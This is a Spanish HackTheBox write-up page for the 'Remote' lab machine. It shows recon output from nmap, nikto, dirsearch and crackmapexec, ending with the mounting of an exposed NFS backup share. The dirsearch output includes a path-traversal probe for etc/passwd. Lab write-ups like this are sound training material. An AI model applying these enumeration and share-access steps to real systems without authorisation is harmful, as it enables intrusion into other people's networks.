<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>Remote HTB Writeup - </title><meta name="author" content="">
<meta name="author-link" content="">
<meta name="description" content="Remote HTB Writeup - Easy Linux Machine from HackTheBox" /><meta name="keywords" content='linux, writeup, easy' /><meta itemprop="name" content="Remote HTB Writeup">
<meta itemprop="description" content="Remote HTB Writeup - Easy Linux Machine from HackTheBox"><meta itemprop="datePublished" content="2021-10-11T12:40:00+02:00" />
<meta itemprop="dateModified" content="2021-10-11T12:40:00+02:00" />
<meta itemprop="wordCount" content="2184">
<meta itemprop="keywords" content="linux,writeup,easy," /><meta property="og:title" content="Remote HTB Writeup" />
<meta property="og:description" content="Remote HTB Writeup - Easy Linux Machine from HackTheBox" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/remote-htb/remote-htb/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-10-11T12:40:00+02:00" />
<meta property="article:modified_time" content="2021-10-11T12:40:00+02:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Remote HTB Writeup"/>
<meta name="twitter:description" content="Remote HTB Writeup - Easy Linux Machine from HackTheBox"/>
<meta name="application-name" content="rottenbytes">
<meta name="apple-mobile-web-app-title" content="rottenbytes"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="/posts/remote-htb/remote-htb/" /><link rel="prev" href="/posts/armaggedon-htb/armaggedon-htb/" /><link rel="next" href="/posts/monitors-htb/monitors-htb/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "Remote HTB Writeup",
    "inLanguage": "",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "\/posts\/remote-htb\/remote-htb\/"
    },"genre": "posts","keywords": "linux, writeup, easy","wordcount":  2184 ,
    "url": "\/posts\/remote-htb\/remote-htb\/","datePublished": "2021-10-11T12:40:00+02:00","dateModified": "2021-10-11T12:40:00+02:00","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": "rottenbytes"
      },"description": "Remote HTB Writeup - Easy Linux Machine from HackTheBox"
  }
  </script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title=""><span id="typeit-header-desktop" class="typeit"></span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title=""><span id="typeit-header-title-mobile" class="typeit"></span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><main class="container"><aside class="toc" id="toc-auto"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside>

  <aside class="aside-custom">
    </aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Remote HTB Writeup</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
      rottenbytes</span></span>
          <span class="post-category">included in <a href="/categories/writeups/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> writeups</a>&ensp;<a href="/categories/htb/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> htb</a></span></div>
      <div class="post-meta-line"><span title="published on 2021-10-11 12:40:00"><i class="fa-regular fa-calendar-alt fa-fw me-1" aria-hidden="true"></i><time datetime="2021-10-11">2021-10-11</time></span>&nbsp;<span title="Updated on 2021-10-11 12:40:00"><i class="fa-regular fa-edit fa-fw me-1" aria-hidden="true"></i><time datetime="2021-10-11">2021-10-11</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>2184 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>11 minutes</span>&nbsp;</div>
    </div><div class="featured-image"><img loading="lazy" src="../assets/posts/remote/remote_banner.png" srcset="/../assets/posts/remote/remote_banner.png, ../assets/posts/remote/remote_banner.png 1.5x, /../assets/posts/remote/remote_banner.png 2x" sizes="auto" data-title="Remote HTB Writeup - Easy Linux Machine from HackTheBox" data-alt="/../assets/posts/remote/remote_banner.png" width="436" height="240" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contents</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#nmap">Nmap</a></li>
    <li><a href="#enumeración-ftp---port-21-tcp">Enumeración FTP - port 21 (TCP)</a></li>
    <li><a href="#enumeración-web---port-80-tcp">Enumeración Web - port 80 (TCP)</a>
      <ul>
        <li><a href="#nikto">Nikto</a></li>
        <li><a href="#dirsearch">Dirsearch</a></li>
      </ul>
    </li>
    <li><a href="#enumeración-smb---port-139445-tcp">Enumeración SMB - port 139,445 (TCP)</a></li>
    <li><a href="#enumeración-nfs---port-111-tcp">Enumeración NFS - port 111 (TCP)</a></li>
  </ul>

  <ul>
    <li><a href="#umbraco-cms">Umbraco CMS</a></li>
    <li><a href="#usertxt">user.txt</a></li>
  </ul>

  <ul>
    <li><a href="#roottxt">root.txt</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><h1 id="recon">Recon</h1>
<h2 id="nmap">Nmap</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100000)</span>
| rpcinfo: 
|   program version    port/proto  service
|   <span style="color:#ae81ff">100000</span>  2,3,4        111/tcp   rpcbind
|   <span style="color:#ae81ff">100000</span>  2,3,4        111/tcp6  rpcbind
|   <span style="color:#ae81ff">100000</span>  2,3,4        111/udp   rpcbind
|   <span style="color:#ae81ff">100000</span>  2,3,4        111/udp6  rpcbind
|   <span style="color:#ae81ff">100003</span>  2,3         2049/udp   nfs
|   <span style="color:#ae81ff">100003</span>  2,3         2049/udp6  nfs
|   <span style="color:#ae81ff">100003</span>  2,3,4       2049/tcp   nfs
|   <span style="color:#ae81ff">100003</span>  2,3,4       2049/tcp6  nfs
|   <span style="color:#ae81ff">100005</span>  1,2,3       2049/tcp   mountd
|   <span style="color:#ae81ff">100005</span>  1,2,3       2049/tcp6  mountd
|   <span style="color:#ae81ff">100005</span>  1,2,3       2049/udp   mountd
|   <span style="color:#ae81ff">100005</span>  1,2,3       2049/udp6  mountd
|   <span style="color:#ae81ff">100021</span>  1,2,3,4     2049/tcp   nlockmgr
|   <span style="color:#ae81ff">100021</span>  1,2,3,4     2049/tcp6  nlockmgr
|   <span style="color:#ae81ff">100021</span>  1,2,3,4     2049/udp   nlockmgr
|   <span style="color:#ae81ff">100021</span>  1,2,3,4     2049/udp6  nlockmgr
|   <span style="color:#ae81ff">100024</span>  <span style="color:#ae81ff">1</span>           2049/tcp   status
|   <span style="color:#ae81ff">100024</span>  <span style="color:#ae81ff">1</span>           2049/tcp6  status
|   <span style="color:#ae81ff">100024</span>  <span style="color:#ae81ff">1</span>           2049/udp   status
|_  <span style="color:#ae81ff">100024</span>  <span style="color:#ae81ff">1</span>           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100005)</span>
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4m25s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-09T21:28:21
|_  start_date: N/A
</code></pre></div><p>A simple vista, me llama la atención, el puerto 21, ya que nos permite el logueo anónimo, también tenemos una página web y SMB, además podemos ver que bajo el puerto 111 está corriendo NFS.</p>
<h2 id="enumeración-ftp---port-21-tcp">Enumeración FTP - port 21 (TCP)</h2>
<p>Tras ver que el puerto 21 está abierto y que nos permite loguearnos anónimamente, probamos a entrar y echar un vistazo a ver si hay algo que nos llame la atención en él, pero no hay nada.</p>
<h2 id="enumeración-web---port-80-tcp">Enumeración Web - port 80 (TCP)</h2>
<p>Al acceder vemos una &ldquo;tienda&rdquo; que ofrece productos de <em>Umbraco</em> . Tras navegar por ella y buscar algún parámetro extraño y revisar el código fuente, no observo nada que me llame la atención. Busco en google &ldquo;Umbraco&rdquo; y aparece que es un CMS. Tras haber estado cotilleando un rato por la web y no haber encontrado nada, procedo a enumerar la web con herramientas básicas.</p>
<p><img loading="lazy" src="../assets/posts/remote/simple-web.png" srcset="/../assets/posts/remote/simple-web.png, ../assets/posts/remote/simple-web.png 1.5x, /../assets/posts/remote/simple-web.png 2x" sizes="auto" data-title="/../assets/posts/remote/simple-web.png" data-alt="/../assets/posts/remote/simple-web.png" width="1920" height="971" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
<h3 id="nikto">Nikto</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nikto -h http://remote.htb
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.180
+ Target Hostname:    remote.htb
+ Target Port:        <span style="color:#ae81ff">80</span>
+ Start Time:         2021-07-12 01:07:18 <span style="color:#f92672">(</span>GMT2<span style="color:#f92672">)</span>
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Server banner has changed from <span style="color:#e6db74">&#39;&#39;</span> to <span style="color:#e6db74">&#39;Microsoft-IIS/10.0&#39;</span> which may suggest a WAF, load balancer or proxy is in place
+ No CGI Directories found <span style="color:#f92672">(</span>use <span style="color:#e6db74">&#39;-C all&#39;</span> to force check all possible dirs<span style="color:#f92672">)</span>
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3092: /home/: This might be interesting...
+ OSVDB-3092: /intranet/: This might be interesting...
+ /umbraco/ping.aspx: Umbraco ping page found
+ <span style="color:#ae81ff">7785</span> requests: <span style="color:#ae81ff">0</span> error<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">7</span> item<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> reported on remote host
+ End Time:           2021-07-12 01:14:14 <span style="color:#f92672">(</span>GMT2<span style="color:#f92672">)</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">416</span> seconds<span style="color:#f92672">)</span>
---------------------------------------------------------------------------
</code></pre></div><p>Nikto nos avisa que existe un directorio llamado <em>Umbraco</em> , al acceder a él vemos que realmente el CMS que se está utilizando es este.</p>
<p><img loading="lazy" src="../assets/posts/remote/umbraco_portal.png" srcset="/../assets/posts/remote/umbraco_portal.png, ../assets/posts/remote/umbraco_portal.png 1.5x, /../assets/posts/remote/umbraco_portal.png 2x" sizes="auto" data-title="/../assets/posts/remote/umbraco_portal.png" data-alt="/../assets/posts/remote/umbraco_portal.png" width="1918" height="971" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
<h3 id="dirsearch">Dirsearch</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ dirsearch -u http://remote.htb -x400,404

  _|. _ _  _  _  _ _|_    v0.4.1
 <span style="color:#f92672">(</span>_<span style="color:#f92672">||</span>| _<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>/_<span style="color:#f92672">(</span>_<span style="color:#f92672">||</span> <span style="color:#f92672">(</span>_| <span style="color:#f92672">)</span>

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span style="color:#ae81ff">30</span> | Wordlist size: <span style="color:#ae81ff">10877</span>

Target: http://remote.htb/

<span style="color:#f92672">[</span>11:31:44<span style="color:#f92672">]</span> Starting: 
<span style="color:#f92672">[</span>11:31:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  312B  - /%2e%2e//google.com
<span style="color:#f92672">[</span>11:31:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    2KB - /.aspx
<span style="color:#f92672">[</span>11:31:55<span style="color:#f92672">]</span> <span style="color:#ae81ff">302</span> -  126B  - /INSTALL  -&gt;  /umbraco/
<span style="color:#f92672">[</span>11:31:55<span style="color:#f92672">]</span> <span style="color:#ae81ff">302</span> -  126B  - /Install  -&gt;  /umbraco/
<span style="color:#f92672">[</span>11:31:58<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -    2KB - /Trace.axd
<span style="color:#f92672">[</span>11:32:00<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  312B  - /<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\e</span>tc<span style="color:#ae81ff">\p</span>asswd
<span style="color:#f92672">[</span>11:32:02<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    2KB - /about-us
<span style="color:#f92672">[</span>11:32:23<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    2KB - /blog
<span style="color:#f92672">[</span>11:32:23<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    2KB - /blog/
<span style="color:#f92672">[</span>11:32:29<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    3KB - /contact.aspx
<span style="color:#f92672">[</span>11:32:29<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    3KB - /contact
<span style="color:#f92672">[</span>11:32:32<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    2KB - /default.aspx
<span style="color:#f92672">[</span>11:32:40<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    2KB - /home
<span style="color:#f92672">[</span>11:32:40<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    2KB - /home.aspx
<span style="color:#f92672">[</span>11:32:42<span style="color:#f92672">]</span> <span style="color:#ae81ff">302</span> -  126B  - /install/  -&gt;  /umbraco/
<span style="color:#f92672">[</span>11:32:42<span style="color:#f92672">]</span> <span style="color:#ae81ff">302</span> -  126B  - /install  -&gt;  /umbraco/
<span style="color:#f92672">[</span>11:32:42<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    1KB - /intranet
<span style="color:#f92672">[</span>11:32:48<span style="color:#f92672">]</span> <span style="color:#ae81ff">500</span> -    3KB - /master/
<span style="color:#f92672">[</span>11:32:54<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    2KB - /people
<span style="color:#f92672">[</span>11:33:04<span style="color:#f92672">]</span> <span style="color:#ae81ff">500</span> -    3KB - /product
<span style="color:#f92672">[</span>11:33:04<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    2KB - /products
<span style="color:#f92672">[</span>11:33:04<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    2KB - /products.aspx
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ dirsearch -u http://10.10.10.180/umbraco -x400,404,403

  _|. _ _  _  _  _ _|_    v0.4.1
 <span style="color:#f92672">(</span>_<span style="color:#f92672">||</span>| _<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>/_<span style="color:#f92672">(</span>_<span style="color:#f92672">||</span> <span style="color:#f92672">(</span>_| <span style="color:#f92672">)</span>

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span style="color:#ae81ff">30</span> | Wordlist size: <span style="color:#ae81ff">10877</span>

Target: http://10.10.10.180/umbraco/

<span style="color:#f92672">[</span>11:36:22<span style="color:#f92672">]</span> Starting: 
<span style="color:#f92672">[</span>11:36:23<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  154B  - /umbraco/js  -&gt;  http://10.10.10.180/umbraco/js/
<span style="color:#f92672">[</span>11:36:26<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  159B  - /umbraco/INSTALL  -&gt;  http://10.10.10.180/umbraco/INSTALL/
<span style="color:#f92672">[</span>11:36:26<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  159B  - /umbraco/Install  -&gt;  http://10.10.10.180/umbraco/Install/
<span style="color:#f92672">[</span>11:36:26<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  158B  - /umbraco/Search  -&gt;  http://10.10.10.180/umbraco/Search/
<span style="color:#f92672">[</span>11:36:29<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  159B  - /umbraco/actions  -&gt;  http://10.10.10.180/umbraco/actions/
<span style="color:#f92672">[</span>11:36:34<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    2KB - /umbraco/application
<span style="color:#f92672">[</span>11:36:34<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    3KB - /umbraco/application/logs/
<span style="color:#f92672">[</span>11:36:34<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    3KB - /umbraco/application/
<span style="color:#f92672">[</span>11:36:34<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    3KB - /umbraco/application/cache/
<span style="color:#f92672">[</span>11:36:34<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  158B  - /umbraco/assets  -&gt;  http://10.10.10.180/umbraco/assets/
<span style="color:#f92672">[</span>11:36:37<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  158B  - /umbraco/config  -&gt;  http://10.10.10.180/umbraco/config/
<span style="color:#f92672">[</span>11:36:38<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  161B  - /umbraco/dashboard  -&gt;  http://10.10.10.180/umbraco/dashboard/
<span style="color:#f92672">[</span>11:36:38<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    4KB - /umbraco/default
<span style="color:#f92672">[</span>11:36:38<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  161B  - /umbraco/developer  -&gt;  http://10.10.10.180/umbraco/developer/
<span style="color:#f92672">[</span>11:36:41<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  159B  - /umbraco/install  -&gt;  http://10.10.10.180/umbraco/install/
<span style="color:#f92672">[</span>11:36:42<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  155B  - /umbraco/lib  -&gt;  http://10.10.10.180/umbraco/lib/
<span style="color:#f92672">[</span>11:36:42<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  163B  - /umbraco/lib/tinymce  -&gt;  http://10.10.10.180/umbraco/lib/tinymce/
<span style="color:#f92672">[</span>11:36:43<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -  657B  - /umbraco/logout.aspx
<span style="color:#f92672">[</span>11:36:43<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  159B  - /umbraco/members  -&gt;  http://10.10.10.180/umbraco/members/
<span style="color:#f92672">[</span>11:36:46<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  159B  - /umbraco/plugins  -&gt;  http://10.10.10.180/umbraco/plugins/
<span style="color:#f92672">[</span>11:36:48<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  158B  - /umbraco/search  -&gt;  http://10.10.10.180/umbraco/search/
<span style="color:#f92672">[</span>11:36:48<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  160B  - /umbraco/settings  -&gt;  http://10.10.10.180/umbraco/settings/
<span style="color:#f92672">[</span>11:36:52<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  157B  - /umbraco/views  -&gt;  http://10.10.10.180/umbraco/views/
</code></pre></div><p>Tras estar un rato &ldquo;cotilleando&rdquo; y fuzzeando la web, no encuentro nada interesante, ni credenciales que se hayan podido dejar sin querer en algún archivo. Pruebo credenciales por defecto en la página de logueo de <em>Umbraco</em>, pero nada funciona.</p>
<h2 id="enumeración-smb---port-139445-tcp">Enumeración SMB - port 139,445 (TCP)</h2>
<p>Al ver estos puertos abiertos pruebo a enumerar algún recurso que se esté compartiendo bajo una null session, pero no nos deja acceder.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ crackmapexec smb --shares 10.10.10.180 -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span>
SMB         10.10.10.180    <span style="color:#ae81ff">445</span>    REMOTE           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 10.0 Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:REMOTE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:remote<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
SMB         10.10.10.180    <span style="color:#ae81ff">445</span>    REMOTE           <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> remote<span style="color:#ae81ff">\:</span> STATUS_ACCESS_DENIED 
SMB         10.10.10.180    <span style="color:#ae81ff">445</span>    REMOTE           <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Error enumerating shares: Error occurs <span style="color:#66d9ef">while</span> reading from remote<span style="color:#f92672">(</span>104<span style="color:#f92672">)</span>
</code></pre></div><h2 id="enumeración-nfs---port-111-tcp">Enumeración NFS - port 111 (TCP)</h2>
<p>Al ver que bajo el puerto 111 está corriendo NFS (Network File System), pruebo a ver si aquí hay algún recurso compartido. Por suerto, podemos ver que se está compartiendo el directorio <em>/site_backups</em>, por lo que lo podemos montar en nuestra máquina.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ showmount -e remote.htb
Export list <span style="color:#66d9ef">for</span> remote.htb:
/site_backups <span style="color:#f92672">(</span>everyone<span style="color:#f92672">)</span>

$ sudo mount -t nfs 10.10.10.180:/site_backups content/nfs/backup_mnt/ -nolock

$ ls -la content/nfs/backup_mnt/
total <span style="color:#ae81ff">123</span>
drwx------ <span style="color:#ae81ff">2</span> nobody   <span style="color:#ae81ff">4294967294</span>  <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2020</span> .
drwxr-xr-x <span style="color:#ae81ff">3</span> jagelito jagelito    <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">9</span> 23:47 ..
drwx------ <span style="color:#ae81ff">2</span> nobody   <span style="color:#ae81ff">4294967294</span>    <span style="color:#ae81ff">64</span> Feb <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">2020</span> App_Browsers
drwx------ <span style="color:#ae81ff">2</span> nobody   <span style="color:#ae81ff">4294967294</span>  <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">2020</span> App_Data
drwx------ <span style="color:#ae81ff">2</span> nobody   <span style="color:#ae81ff">4294967294</span>  <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">2020</span> App_Plugins
drwx------ <span style="color:#ae81ff">2</span> nobody   <span style="color:#ae81ff">4294967294</span>    <span style="color:#ae81ff">64</span> Feb <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">2020</span> aspnet_client
drwx------ <span style="color:#ae81ff">2</span> nobody   <span style="color:#ae81ff">4294967294</span> <span style="color:#ae81ff">49152</span> Feb <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">2020</span> bin
drwx------ <span style="color:#ae81ff">2</span> nobody   <span style="color:#ae81ff">4294967294</span>  <span style="color:#ae81ff">8192</span> Feb <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">2020</span> Config
drwx------ <span style="color:#ae81ff">2</span> nobody   <span style="color:#ae81ff">4294967294</span>    <span style="color:#ae81ff">64</span> Feb <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">2020</span> css
-rwx------ <span style="color:#ae81ff">1</span> nobody   <span style="color:#ae81ff">4294967294</span>   <span style="color:#ae81ff">152</span> Nov  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">2018</span> default.aspx
